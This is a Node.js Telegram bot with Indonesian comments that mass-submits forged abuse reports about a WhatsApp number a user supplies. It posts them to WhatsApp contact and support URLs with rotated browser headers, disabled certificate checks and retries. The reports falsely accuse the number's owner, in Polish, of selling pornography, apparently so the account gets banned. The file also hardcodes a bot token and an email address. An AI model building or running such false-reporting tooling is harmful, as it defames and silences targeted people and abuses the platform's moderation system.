const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const https = require('https');

// Konfigurasi Bot
const TOKEN = '7901822583:AAE5HS_OwFcRf6iMUHNfQK9zkP_cIwb7TxM';
const bot = new TelegramBot(TOKEN, {polling: true});

// URL Target WhatsApp
const WHATSAPP_URLS = [
    'https://www.whatsapp.com/contact/?subject=messenger',
    'https://static.whatsapp.net/rsrc.php/v4/yR/r/ERz6pNGhHp8.js', 
    'https://faq.whatsapp.com/465883178708358/?helpref=uf_share'
];

// Data Default
const DEFAULT_EMAIL = 'hozooimut@gmail.com';
const DEFAULT_MESSAGE = (phone) => `Witam, sprzedaję porno i mam kilka firm.  Sprzedajemy pornografię innym organizacjom.  Jeśli chcesz z nami pracować i zarabiać 300 مااان م miesięcznie, skontaktuj się z nami!
https://api.whatsapp.com/send?phone=${phone}`;

// Koleksi Headers dari berbagai browser dan device
const BROWSER_HEADERS = [
    // Firefox Windows
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1'
    },
    // ... (keep your existing headers)
];

// HTTPS Agent dengan konfigurasi khusus
const httpsAgent = new https.Agent({
    keepAlive: true,
    rejectUnauthorized: false,
    timeout: 8000
});

// Fungsi untuk mendapatkan headers acak
function getRandomHeaders() {
    const headers = BROWSER_HEADERS[Math.floor(Math.random() * BROWSER_HEADERS.length)];
    headers['Content-Type'] = 'application/json';
    headers['Origin'] = 'https://www.whatsapp.com';
    headers['Referer'] = 'https://www.whatsapp.com/';
    return headers;
}

// Fungsi untuk Mengirim Laporan dengan retry
async function sendReport(phone, chatId, retries = 3) {
    const payload = {
        phone: phone,
        email: DEFAULT_EMAIL,
        device: 'Android',
        message: DEFAULT_MESSAGE(phone)
    };

    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            // Kirim ke semua URL dengan headers berbeda
            const requests = WHATSAPP_URLS.map(url => 
                axios.post(url, payload, {
                    timeout: 8000,
                    headers: getRandomHeaders(),
                    httpsAgent: httpsAgent,
                    maxRedirects: 2
                })
            );
            
            await Promise.all(requests);
            bot.sendMessage(chatId, `✅ Laporan untuk nomor ${phone} berhasil dikirim!`);
            return true;
        } catch (error) {
            console.error(`Attempt ${attempt} failed:`, error.message);
            if (attempt < retries) {
                await new Promise(resolve => setTimeout(resolve, 2000 * attempt)); // Exponential backoff
            } else {
                bot.sendMessage(chatId, `❌ Gagal mengirim laporan untuk nomor ${phone} setelah ${retries} percobaan.`);
                return false;
            }
        }
    }
}

// Handler untuk perintah /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Halo! Kirim nomor WhatsApp yang ingin dilaporkan.\nContoh: 6281234567890');
});

// Handler untuk pesan teks
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    // Skip jika pesan adalah command
    if (text.startsWith('/')) return;

    // Validasi nomor telepon
    const phoneRegex = /^[0-9]{10,15}$/;
    if (phoneRegex.test(text)) {
        bot.sendMessage(chatId, `⏳ Mengirim laporan untuk nomor ${text}...`);
        sendReport(text, chatId);
    } else {
        bot.sendMessage(chatId, 'Format nomor tidak valid. Harap masukkan nomor tanpa tanda + atau spasi.\nContoh: 6281234567890');
    }
});

console.log('Bot sedang berjalan...');